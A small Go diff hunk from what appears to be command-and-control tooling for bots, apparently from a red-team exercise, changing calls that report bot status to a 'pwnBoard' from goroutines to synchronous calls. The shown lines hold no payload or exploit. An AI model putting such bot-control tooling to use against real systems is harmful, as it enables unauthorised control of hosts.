@@ -68,10 +68,10 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
 			// Close the socket
 			unix.Close(fd)
-			go updatepwnBoard(bot)
+			updatepwnBoard(bot)
 		} else {
 			unix.Close(fd)
-			go updatepwnBoard(bot)
+			updatepwnBoard(bot)
 		}
 	}
 }
